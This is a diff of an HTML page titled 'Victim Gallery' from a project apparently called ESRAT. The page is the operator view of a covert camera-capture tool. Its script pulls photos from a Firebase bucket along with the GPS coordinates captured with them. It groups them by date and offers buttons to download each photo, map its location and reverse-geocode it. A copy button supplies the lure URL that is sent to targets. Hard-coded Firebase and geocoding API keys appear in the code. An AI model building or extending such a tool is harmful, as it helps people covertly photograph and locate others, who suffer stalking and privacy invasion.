@@ -9,30 +9,627 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
-    <link rel="stylesheet" href="styles.css"> <link rel="stylesheet" href="ipfind868842059977526.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f8;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .home-page {
+            min-height: 100vh;
+        }
+
+        /* NAV SECTION - EXACTLY AS ORIGINAL */
+        .navbar {
+            margin-right: 2%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            overflow: hidden;
+            z-index: 2;
+        }
+        .navbar a:hover,
+        .navbar a.active {
+            color: #00abf0;
+            font-weight: bold;
+        }
+        .navbar .logo {
+            font-size: 28px;
+            font-weight: 300;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            z-index: 2;
+        }
+        .navbar ul {
+            list-style-type: none;
+            display: flex;
+            gap: 15px;
+        }
+        .navbar ul li {
+            font-weight: 300;
+        }
+        .navbar ul li .icon {
+            line-height: 0.9;
+            font-weight: 300;
+        }
+        .navbar ul li a {
+            color: #9ddf05;
+            transition: color 0.3s ease-in-out;
+            text-decoration: none;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin: 0; 
+            padding: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .dynamic-text {
+            letter-spacing: 1px; 
+            text-transform: uppercase; 
+            color: #3498db;
+            background: linear-gradient(90deg, #3498db, #9b59b6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: textAnimation 3s infinite;
+            display: inline-block;
+        }
+
+        .emoji {
+            font-size: inherit;
+            margin-left: 10px;
+        }
+
+        @keyframes textAnimation {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0); }
+        }
+
+        /* Main content styling */
+        .content-container {
+            display: flex;
+            flex-direction: column;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+        }
+
+        /* URL box styling */
+        .url-box {
+            background: #f0f4f8;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #d1d5db;
+        }
+
+        .url-text {
+            font-family: monospace;
+            color: #1a73e8;
+            word-break: break-all;
+            margin-right: 10px;
+        }
+
+        .copy-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+            white-space: nowrap;
+        }
+
+        .copy-btn:hover {
+            background: #0d5bba;
+        }
+
+        /* Date selection panel */
+        .date-panel {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .date-panel h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .date-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+        }
+
+        .date-item {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: 1px solid #e0e0e0;
+            position: relative;
+            text-align: center;
+        }
+
+        .date-item:hover {
+            background: #e9ecef;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .date-item.active {
+            background: #007bff;
+            color: white;
+            border-color: #007bff;
+        }
+
+        .date-count {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: #ff4757;
+            color: white;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        /* Photo display panel */
+        .photo-panel {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+
+        .photo-panel h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .photo-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .photo-item {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .photo-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .photo-name {
+            font-weight: 500;
+        }
+
+        .photo-time {
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .photo-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .photo-btn {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .view-btn {
+            background-color: #007bff;
+            color: white;
+        }
+
+        .view-btn:hover {
+            background-color: #0069d9;
+        }
+
+        .download-btn {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .download-btn:hover {
+            background-color: #218838;
+        }
+
+        .map-btn {
+            background-color: #6c757d;
+            color: white;
+        }
+
+        .map-btn:hover {
+            background-color: #5a6268;
+        }
+
+        .dl-map-btn {
+            background-color: #17a2b8;
+            color: white;
+        }
+
+        .dl-map-btn:hover {
+            background-color: #138496;
+        }
+
+        /* Fullscreen preview */
+        .photo-preview {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .photo-preview.active {
+            display: flex;
+        }
+
+        .preview-image {
+            max-width: 90%;
+            max-height: 80%;
+            object-fit: contain;
+        }
+
+        .preview-actions {
+            margin-top: 20px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .preview-btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .preview-download {
+            background: #28a745;
+            color: white;
+        }
+
+        .preview-close {
+            background: #dc3545;
+            color: white;
+        }
+
+        /* Media queries */
+        @media (max-width: 768px) {
+            .date-list {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .photo-actions {
+                gap: 8px;
+            }
+            
+            .photo-btn {
+                flex-grow: 1;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .date-item {
+                padding: 10px;
+                font-size: 0.9rem;
+            }
+            
+            .photo-btn {
+                padding: 6px 8px;
+                font-size: 0.8rem;
+            }
+        }
+    </style>
 </head>
-<body>
-    <body class="home-page">
-        <nav class="navbar"> 
-            <h class="logo"> <a href="/ESRAT/index-home.html"> <img src="/ESRAT/apks/logo.png" height="100px"></a></h>
-            <ul>
-              <li><a href="/ESRAT/events/index.events.html" class="active">EVENTS</a></li>
-              <li><a href="/ESRAT/index-apk.html">H@CKS</a></li>
-              <li><a href="/ESRAT/gallery/index.gallery.html">GALLERY</a></li>
-              <li><a href="/ESRAT/index.html">ADMIN</a></li>
-            </ul>
-        </nav>
-    </body>
-    <h1>
-      <span class="dynamic-text">Victim Gallery</span>
-      <span class="emoji">🧑‍💻</span>
-  </h1>  
-   <br> <br>
-    <h2>Dates of photos taken: ⬇️</h2>
-    <div id="dateList"></div> 
-    
-    <h2>Photos: ⬇️</h2>
-    <div id="photoList"></div> 
-    <script src="script.js"></script>
+<body class="home-page">
+    <nav class="navbar"> 
+        <h class="logo"> <a href="/ESRAT/index-home.html"> <img src="/ESRAT/apks/logo.png" height="100px"></a></h>
+        <ul>
+            <li><a href="/ESRAT/events/index.events.html" class="active">EVENTS</a></li>
+            <li><a href="/ESRAT/index-apk.html">H@CKS</a></li>
+            <li><a href="/ESRAT/gallery/index.gallery.html">GALLERY</a></li>
+            <li><a href="/ESRAT/index.html">ADMIN</a></li>
+        </ul>
+    </nav>
+
+    <div class="content-container">
+        <h1>
+            <span class="dynamic-text">Victim Gallery</span>
+            <span class="emoji">🧑‍💻</span>
+        </h1>
+
+        <div class="url-box">
+            <span class="url-text">https://es-universe.github.io/ESRAT/events/CameraModule/index.html</span>
+            <button class="copy-btn" onclick="copyUrl()">Copy URL</button>
+        </div>
+
+        <div class="date-panel">
+            <h2>Dates of photos taken: ⬇️</h2>
+            <div id="dateList" class="date-list"></div>
+        </div>
+
+        <div class="photo-panel">
+            <h2>Photos: ⬇️</h2>
+            <div id="photoList" class="photo-list"></div>
+        </div>
+    </div>
+
+    <!-- Fullscreen photo preview -->
+    <div class="photo-preview" id="photoPreview">
+        <img class="preview-image" id="previewImage" alt="Fullscreen preview">
+        <div class="preview-actions">
+            <button class="preview-btn preview-download" onclick="downloadCurrentPhoto()">Download</button>
+            <button class="preview-btn preview-close" onclick="closePreview()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // Your Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
+            authDomain: "webcamera-es-universe-git.firebaseapp.com",
+            databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
+            projectId: "webcamera-es-universe-git",
+            storageBucket: "webcamera-es-universe-git.appspot.com",
+            messagingSenderId: "949054088643",
+            appId: "1:949054088643:web:039f79fcae7259f4358976"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+        const database = firebase.database();
+
+        let photosByDate = {};
+        let currentPreviewPhoto = null;
+
+        // Function to format date to IST (Indian Standard Time)
+        function formatToIST(dateString) {
+            const utcDate = new Date(dateString);
+            const istOffset = 5.5 * 60 * 60 * 1000;
+            const istDate = new Date(utcDate.getTime() + istOffset);
+            const options = { year: 'numeric', month: 'short', day: 'numeric' };
+            return istDate.toLocaleDateString('en-US', options);
+        }
+
+        function displayPhotosByDate() {
+            const storageRef = storage.ref('users');
+            const dateList = document.getElementById('dateList');
+            const photoList = document.getElementById('photoList');
+
+            storageRef.listAll().then((result) => {
+                const photos = result.items;
+
+                const promises = photos.map((imageRef) => {
+                    return imageRef.getMetadata().then((metadata) => {
+                        const timestamp = metadata.timeCreated;
+                        const formattedDate = formatToIST(timestamp);
+
+                        if (!photosByDate[formattedDate]) {
+                            photosByDate[formattedDate] = [];
+                        }
+
+                        const userLocation = {
+                            latitude: metadata.customMetadata ? metadata.customMetadata.latitude : null,
+                            longitude: metadata.customMetadata ? metadata.customMetadata.longitude : null
+                        };
+
+                        photosByDate[formattedDate].push({
+                            name: imageRef.name,
+                            fullPath: imageRef.fullPath,
+                            time: new Date(timestamp).toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
+                            location: userLocation
+                        });
+                    });
+                });
+
+                Promise.all(promises).then(() => {
+                    const sortedDates = Object.keys(photosByDate).sort((a, b) => new Date(b) - new Date(a));
+                    dateList.innerHTML = '';
+
+                    sortedDates.forEach((date) => {
+                        const dateItem = document.createElement('div');
+                        dateItem.className = 'date-item';
+                        dateItem.innerHTML = `
+                            ${date}
+                            <div class="date-count">${photosByDate[date].length}</div>
+                        `;
+                        dateItem.onclick = () => {
+                            document.querySelectorAll('.date-item').forEach(item => {
+                                item.classList.remove('active');
+                            });
+                            dateItem.classList.add('active');
+                            displayPhotosForDate(photosByDate[date]);
+                        };
+
+                        dateList.appendChild(dateItem);
+                    });
+
+                    if (sortedDates.length > 0) {
+                        const firstDateItem = dateList.querySelector('.date-item');
+                        firstDateItem.classList.add('active');
+                        displayPhotosForDate(photosByDate[sortedDates[0]]);
+                    }
+
+                    if (sortedDates.length === 0) {
+                        dateList.textContent = 'No photos found for any date.';
+                    }
+                });
+            }).catch((error) => {
+                console.error('Error listing images:', error);
+                dateList.textContent = 'Error loading photos. Please try again later.';
+            });
+        }
+
+        function displayPhotosForDate(photos) {
+            const photoList = document.getElementById('photoList');
+            photoList.innerHTML = '';
+
+            if (photos.length === 0) {
+                photoList.textContent = 'No photos available for this date.';
+                return;
+            }
+
+            photos.forEach((photo) => {
+                const photoItem = document.createElement('div');
+                photoItem.className = 'photo-item';
+                
+                photoItem.innerHTML = `
+                    <div class="photo-header">
+                        <span class="photo-name">${photo.name}</span>
+                        <span class="photo-time">${photo.time}</span>
+                    </div>
+                    <div class="photo-actions">
+                        <button class="photo-btn view-btn" onclick="showFullPhoto('${photo.fullPath}', '${photo.name}')">View</button>
+                        <button class="photo-btn download-btn" onclick="downloadPhoto('${photo.fullPath}', '${photo.name}')">Download</button>
+                        <button class="photo-btn map-btn" onclick="showMap(${photo.location.latitude}, ${photo.location.longitude})">Map</button>
+                        <button class="photo-btn dl-map-btn" onclick="downloadMap(${photo.location.latitude}, ${photo.location.longitude})">DL Map</button>
+                    </div>
+                `;
+                photoList.appendChild(photoItem);
+            });
+        }
+
+        function showFullPhoto(photoPath, photoName) {
+            const storageRef = storage.ref(photoPath);
+            storageRef.getDownloadURL().then((url) => {
+                currentPreviewPhoto = { url, name: photoName };
+                document.getElementById('previewImage').src = url;
+                document.getElementById('photoPreview').classList.add('active');
+            }).catch((error) => {
+                console.error('Error retrieving image URL:', error);
+                alert('Error loading image. Please try again.');
+            });
+        }
+
+        function closePreview() {
+            document.getElementById('photoPreview').classList.remove('active');
+            currentPreviewPhoto = null;
+        }
+
+        function downloadCurrentPhoto() {
+            if (currentPreviewPhoto) {
+                downloadPhotoByUrl(currentPreviewPhoto.url, currentPreviewPhoto.name);
+            }
+        }
+
+        function downloadPhoto(photoPath, photoName) {
+            const storageRef = storage.ref(photoPath);
+            storageRef.getDownloadURL().then((url) => {
+                downloadPhotoByUrl(url, photoName);
+            }).catch((error) => {
+                console.error('Error retrieving image URL:', error);
+                alert('Error downloading image. Please try again.');
+            });
+        }
+
+        function downloadPhotoByUrl(url, filename) {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename || 'download';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        function showMap(latitude, longitude) {
+            if (latitude && longitude) {
+                const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15`;
+                window.open(mapUrl, '_blank');
+            } else {
+                alert('No coordinates available for this photo.');
+            }
+        }
+
+        function downloadMap(latitude, longitude) {
+            const apiKey = '6706339e20b94127377139nyudb9267';
+            const reverseGeocodingUrl = `https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}&api_key=${apiKey}`;
+            window.open(reverseGeocodingUrl, '_blank');
+        }
+
+        function copyUrl() {
+            const url = 'https://es-universe.github.io/ESRAT/events/CameraModule/index.html';
+            navigator.clipboard.writeText(url).then(() => {
+                const copyBtn = document.querySelector('.copy-btn');
+                const originalText = copyBtn.textContent;
+                copyBtn.textContent = 'Copied!';
+                setTimeout(() => {
+                    copyBtn.textContent = originalText;
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy URL: ', err);
+            });
+        }
+
+        // Close preview when clicking outside the image
+        document.getElementById('photoPreview').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('photoPreview')) {
+                closePreview();
+            }
+        });
+
+        // Close preview with ESC key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && document.getElementById('photoPreview').classList.contains('active')) {
+                closePreview();
+            }
+        });
+
+        window.onload = displayPhotosByDate;
+    </script>
 </body>
 </html>
